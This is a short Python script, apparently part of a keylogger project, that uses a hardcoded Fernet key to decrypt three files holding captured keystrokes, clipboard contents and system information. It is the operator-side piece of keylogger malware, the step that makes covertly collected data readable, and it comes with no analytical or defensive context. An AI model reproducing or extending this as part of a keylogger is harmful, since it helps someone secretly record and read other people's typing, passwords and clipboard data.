from cryptography.fernet import Fernet

key = "1iDy_ow79Uf-ZuSRf6WhRg1onb1Pix8oCpAgBbbFlVY="
keys_information_encrypt = "key_log_encrypted.txt"
system_information_encrypted = "system_encrypted.txt"
clipboard_information_encrypt = "clipboard_encrypted.txt"

file_path = "D:\\python\\Keylogger\\keylogger\\Project_File"
extend = "\\"

encrypt_files = [file_path + extend + keys_information_encrypt, file_path + extend +
                 system_information_encrypted, file_path + extend + clipboard_information_encrypt]
count = 0

for decrypting_file in encrypt_files:
    with open(decrypting_file, "rb") as f:
        data = f.read()
    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)
    with open(decrypting_file, "wb") as f:
        f.write(decrypted)
    count += 1
    print("File {0} decrypted".format(count))
